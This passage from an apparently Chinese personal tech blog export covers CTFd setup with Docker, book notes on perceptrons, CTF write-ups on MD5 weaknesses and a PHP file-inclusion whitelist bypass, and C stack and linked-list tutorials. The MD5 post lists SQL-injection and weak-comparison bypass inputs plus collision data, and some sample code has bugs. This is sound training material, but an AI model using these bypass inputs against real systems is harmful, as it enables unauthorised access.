MiB/s, done.Resolving deltas: 100% (8691/8691), done. 安装docker12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo apt install docker docker-compose 1234567┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker --versionDocker version 20.10.8+dfsg1, build 3967b7d ┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker-compose --versiondocker-compose version 1.27.4, build unknown 添加执行权限12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo chmod +x /usr/bin/docker-compose 在CTFd根目录下启动docker123456789101112131415161718192021┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo docker-compose up -d 130 ⨯Creating network &quot;ctfd_internal&quot; with the default driverCreating network &quot;ctfd_default&quot; with the default driverPulling db (mariadb:10.4.12)...10.4.12: Pulling from library/mariadb23884877105a: Pull completebc38caa0f5b9: Pull complete2910811b6c42: Pull complete36505266dcc6: Pull completee69dcc78e96e: Pull complete222f44c5392d: Pull completeefc64ea97b9c: Pull complete9912a149de6b: Pull complete7ef6cf5b5697: Pull complete8a05be3688e0: Pull completec09ffdc1b660: Pull complete2eb7fe288fc8: Pull completeb41d1cc4d40f: Pull completea92376500910: Pull complete...... 注：首次启动由于下载依赖等会比较慢 平台配置打开浏览器，输入127.0.0.1:8000配置赛事相关信息 添加题目在GitHub上找题目，clone到本地 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/CTFTraining.gitCloning into &#x27;CTFTraining&#x27;...remote: Enumerating objects: 86, done.remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, done.Resolving deltas: 100% (48/48), done. 实际测试发现不能把所有的题目都clone下来，就先试一道题 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...remote: Enumerating objects: 32, done.remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, done.Resolving deltas: 100% (3/3), done. docker images 命令查看已有镜像 docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像 12345678910111213141516┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker build ./ -t 0ctf_2016_unserialize Sending build context to Docker daemon 1.841MBStep 1/8 : FROM php:5.6-fpm-alpine5.6-fpm-alpine: Pulling from library/php169185f82c45: Pull complete 8ba0d98519aa: Pull complete 75f762bbc102: Pull complete 04f939cd9fe5: Pull complete 5feedbe48aa1: Pull complete 47e0f87348c0: Pull complete 68b7fb9d3c14: Pull complete 7e4b086d6b5d: Pull complete a15e624700d4: Pull complete f714654cc532: Pull complete Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b 123456789101112┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker images 1 ⨯REPOSITORY TAG IMAGE ID CREATED SIZE0ctf_2016_unserialize latest 931233916db0 2 minutes ago 333MBctfd_ctfd latest b36ee26f2439 49 minutes ago 791MBpython 3.7-slim-buster cd7d26aa86ac 10 days ago 113MBnginx 1.17 9beeba249f3e 18 months ago 127MBmariadb 10.4.12 b6184b68d1fd 19 months ago 357MBredis 4 191c4017dcdd 19 months ago 89.3MBubuntu 18.10 9dc19675e327 2 years ago 67.3MBphp 5.6-fpm-alpine 6feac8f2ef42 2 years ago 54.5MBphp 5-apache-jessie d34f09f63596 2 years ago 374MB 再通过镜像创建容器： 12┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize 查看现有容器： 12345678┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9cae78cf79bc 0ctf_2016_unserialize &quot;docker-php-entrypoi…&quot; 5 seconds ago Up 4 seconds 9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp 0ctf_2016_unserialize3b3889db12c7 nginx:1.17 &quot;nginx -g &#x27;daemon of…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp ctfd_nginx_17b58b9661715 ctfd_ctfd &quot;/opt/CTFd/docker-en…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp ctfd_ctfd_193e49564bff7 mariadb:10.4.12 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes ctfd_db_19f4380eb4639 redis:4 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes 访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口 打开题目容器： 1docker exec -i -t &lt;container&gt; /bin/sh 为题目添加flag： 1234567┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker exec -i -t 0ctf_2016_unserialize /bin/sh 1 ⨯/var/www/html # lsclass.php config.php index.php profile.php register.php static update.php upload www.zip/var/www/html # echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt/var/www/html # lsclass.php config.php flag.txt index.php profile.php register.php static update.php upload www.zip 最后在后台添加题目地址等信息 同理可添加其他题目 搭建中遇到的问题 git clone 命令克隆失败： 1234┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...fatal: unable to access &#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;: Failed to connect to github.com port 443: Connection refused 由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来 有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因） 1234567891011121314151617181920212223242526272829303132┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]└─$ sudo docker build ./ -t urlstorage 1 ⨯Sending build context to Docker daemon 282.6kBStep 1/7 : FROM ubuntu:18.1018.10: Pulling from library/ubuntu8a532469799e: Pull complete 32f4dcec3531: Pull complete 230f0701585e: Pull complete e01f70622967: Pull complete Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686cStatus: Downloaded newer image for ubuntu:18.10 ---&gt; 9dc19675e327Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=&quot;2.1.1&quot; ---&gt; Running in 98e854ac92f3Removing intermediate container 98e854ac92f3 ---&gt; 154a521cb653Step 3/7 : RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha ---&gt; Running in 8d702a730242Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InReleaseIgn:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InReleaseIgn:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InReleaseErr:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release 404 Not Found [IP: 101.6.15.130 80]Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release 404 Not Found [IP: 101.6.15.130 80]Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release 404 Not Found [IP: 101.6.15.130 80]Reading package lists...E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27; does not have a Release file.E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27; does not have a Release file. E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27; does not have a Release file. The command &#x27;/bin/sh -c sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27; returned a non-zero code: 100 许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"Deep Learning from Scratch","slug":"deep_learning_from_scratch","date":"2021-11-28T07:05:56.160Z","updated":"2021-11-30T14:51:29.989Z","comments":true,"path":"2021/11/28/deep_learning_from_scratch/","link":"","permalink":"http://uniqueland.top/2021/11/28/deep_learning_from_scratch/","excerpt":"读书记录","text":"读书记录 收获： 对matplotlib、numpy有了初步认识 了解了一些基础概念 跟随书本实现了简单的逻辑门电路 认识了感知机、激活函数 numpy:123456import numpy as npx = np.array([1.0,2.0,3.0]) #生成数组print(x)print(x.dtype) #查看数据类型print(x.shape) #查看矩阵形状x = x.flatten() #将矩阵转换为一维数组 matplotlib12345678910import matplotlib.pyplot as pltfrom matplotlib.image import imreadx = [1, 2, 3, 4, 5]y = [2, 4, 6, 8, 10]plt.plot(x, y) #绘制图形plt.show() #显示坐标系img = imread(&quot;lena.png&quot;)plt.imshow(img) #显示图像 基础概念 广播：将与矩阵相乘的标量转换为相应大小矩阵的功能 张量：一般化之后的向量或矩阵 感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。 简单逻辑门的实现12345678910111213141516171819202122232425262728293031323334353637import numpy as npdef AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5 -0.5]) b = 0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.2 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 感知机感知机的局限性​ 单层感知机只能表示线性空间 多层感知机的优势 多层感知机可以实现非线性空间 使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数 激活函数定义：将输入信号的总和转换为输出信号的函数 sigmoid函数：$$h(x) = \\frac{1}{(1+e^{-x})}$$ 阶跃函数： 12345def step_function(x): if x &gt; 0: return 1 else: return 0 或者 123def step_function(x): y = x &gt; 0 return y.astype(np.int) ReLU函数$$h(x)=\\begin{cases}x (x&gt;0)\\0 (x\\leq0)\\\\end{cases}$$ 恒等函数 softmax函数$$y_k=\\frac{e^}{\\sum_{i=1}^ne^{a_i}}$$","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"有关md5的一些信息","slug":"something_about_md5","date":"2021-11-23T15:56:14.073Z","updated":"2021-11-23T16:35:02.663Z","comments":true,"path":"2021/11/23/something_about_md5/","link":"","permalink":"http://uniqueland.top/2021/11/23/something_about_md5/","excerpt":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种","text":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种 在sql注入中 若遇到了类似以下的情况 123$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); 可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸 在弱类型比较中 若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零 123456789&lt;?php$a = &quot;s1502113478a&quot;;$b = &quot;s1836677006a&quot;;$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php md5.php 0e8615801632915612474043813960640e481036490867661113260034900752 在允许传递数组时 可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true 123456789&lt;?php$a = array();$b = array();$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php em_array.php PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 5PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 6 虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式： 1a[]=1 &amp; b[1]=&quot;b&quot; &amp; c[] md5碰撞 当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码 12345678910111213141516171819202122232425262728293031323334353637383940414243#!coding:utf-8hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;hexList1 = []intList1 = []asciiString1 =&#x27;&#x27;while True: intString1 = hexString1[0:2] hexString1 = hexString1[2:] hexList1.append(intString1) if (hexString1 == &#x27;&#x27;): breakfor i in hexList1: intList1.append(int(i,16))for j in intList1: asciiString1 += chr(int(j))f = open(&#x27;1.bin&#x27;,&#x27;w&#x27;)f.write(asciiString1)f.close()hexList2 = []intList2 = []asciiString2 =&#x27;&#x27;while True: intString2 = hexString2[0:2] hexString2 = hexString2[2:] hexList2.append(intString2) if (hexString2 == &#x27;&#x27;): breakfor i in hexList2: intList2.append(int(i,16))for j in intList2: asciiString2 += chr(int(j))f = open(&#x27;2.bin&#x27;,&#x27;w&#x27;)f.write(asciiString2)f.close() 1234567891011121314#!coding:utf-8import urllib.requesturlString1=&#x27;&#x27;urlString2 = &#x27;&#x27;for line in open(&#x27;1.bin&#x27;): urlString1 += urllib.parse.quote(line)for line in open(&#x27;2.bin&#x27;): urlString2 += urllib.parse.quote(line)print(urlString1)print(urlString2)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"}]},{"title":"HCTF 2018WarmUp 1","slug":"[HCTF 2018]WarmUp 1","date":"2021-11-07T15:15:57.237Z","updated":"2021-11-07T15:57:44.286Z","comments":true,"path":"2021/11/07/[HCTF 2018]WarmUp 1/","link":"","permalink":"http://uniqueland.top/2021/11/07/[HCTF%202018]WarmUp%201/","excerpt":"一上来便是一张天真无邪的笑脸","text":"一上来便是一张天真无邪的笑脸无头绪，f12查源码，发现source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 开始代码审计 网页通过对传入的参数进行过滤后进行文件包含 一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了 123456789if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; 在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。 1234567$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; 判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里 最终payload：","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"使用C语言实现栈","slug":"stack_by_C","date":"2021-09-05T14:17:42.819Z","updated":"2021-09-05T15:09:46.818Z","comments":true,"path":"2021/09/05/stack_by_C/","link":"","permalink":"http://uniqueland.top/2021/09/05/stack_by_C/","excerpt":"说明 作为栈顶的节点不存储数据","text":"说明 作为栈顶的节点不存储数据，仅作定位功能 数据项的类型可自行定义 在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已 栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现 主函数仅作各函数的演示使用，可自定义 定义相应结构 1234typedef struct node&#123; int data; struct node *next;&#125;node; 该结构由一个整型和一个指向此结构的指针组成。 定义push函数 123456789int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; top-&gt;data++; return data;&#125; 第一步：分配空间 第二步：存储数据 第三步：改变栈顶和新增项的next指针，递增top节点的data项 定义pop函数 12345678910111213int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125; 第一步：判断栈是否为空 第二步：定义变量存储待弹出的数据和待删除节点 第三步：改变栈顶的next指针 释放待删除节点空间，删除节点 定义初始化函数 为栈顶节点分配空间并初始化指针为空 1234567node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125; 定义遍历显示函数 1234567void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125; 将当前节点指向栈顶的下一个节点 当前节点不为空时进入遍历循环 打印当前节点的数据项 将当前节点指向下一个节点 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; int data; struct node *next;&#125;node;int push(node *top, int data);int pop(node *top);node* stack_init();void display(node *current);int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; return data;&#125;int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125;node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125;void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125;int main()&#123; int first_input; int pop_input, pop_data; node *top = stack_init(); int status; printf(&quot;Enter strings, Ctrl+Z to quit.\\n&quot;); status = scanf(&quot;%d&quot;,&amp;first_input); while(status!=EOF)&#123; push(top, first_input); status = scanf(&quot;%d&quot;,&amp;first_input); &#125; display(top); printf(&quot;Now enter 1 to pop data, 0 to quit.\\n&quot;); scanf(&quot;%d&quot;,&amp;pop_input); while(pop_input==1)&#123; pop_data = pop(top); if(pop_data==-1)&#123; break; &#125; printf(&quot;pop_data: %d\\n&quot;,pop_data); scanf(&quot;%d&quot;,&amp;pop_input); &#125; printf(&quot;\\nDone\\n&quot;); return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"使用C语言实现链表","slug":"link_list_by_C","date":"2021-05-02T06:13:00.666Z","updated":"2021-09-05T14:19:04.270Z","comments":true,"path":"2021/05/02/link_list_by_C/","link":"","permalink":"http://uniqueland.top/2021/05/02/link_list_by_C/","excerpt":"","text":"第一步：定义相应结构 由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点； 12345typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link; 该结构由一个字符数组，一项编号和一个指向此结构的指针组成。 第二步：定义输入函数 为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()； 1234567891011121314151617char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125; 该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针； 在函数内部，我声明了两个字符指针，一个用来接受fgets函数的返回值，一个用来接受查找字符函数(strchr)的返回值； 关于fgets()函数： 如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\\0')，使之成为一个字符串； 如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址； 需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针； 关于strchr()函数： 在某个字符数组中查找某字符，并返回指向该字符的指针 r如果字符串中不包含该字符，则返回一个空指针 经过重写，修改如下： 首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val； 第三步：编写主函数进行测试 12345678910111213141516171819202122232425int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125; 首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出； 在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除； 在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。 源代码 最后附上源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define MAX_INPUT 20char* s_gets(char* st, int n);char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125;typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link;int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 